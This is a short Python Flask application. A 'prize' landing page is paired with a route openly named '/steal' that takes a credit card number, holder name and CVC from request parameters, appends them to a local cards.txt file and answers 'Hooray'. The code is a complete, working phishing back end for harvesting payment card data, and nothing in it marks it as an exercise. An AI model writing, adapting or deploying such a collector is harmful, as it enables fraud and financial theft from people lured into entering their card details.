from flask import Flask
from flask import request
from flask import render_template
from random import choice

app = Flask(__name__)

@app.route('/')
def index():
    prizes = ['turtle', 'loanwords', 'enlightment', 'sleep', 'sheep']
    prize = choice(prizes)
    return render_template('main1.html', prize=prize)


@app.route('/steal')
def steal():
    number = request.args['number']
    holder = request.args['holder']
    cvc = request.args['CVC']

    f = open('cards.txt', 'a')
    f.write('{} {} {}\n'.format(number, holder, cvc))
    f.close()

    return '<h3>Hooray</h3>'


if __name__ == '__main__':
    app.run(debug=True)
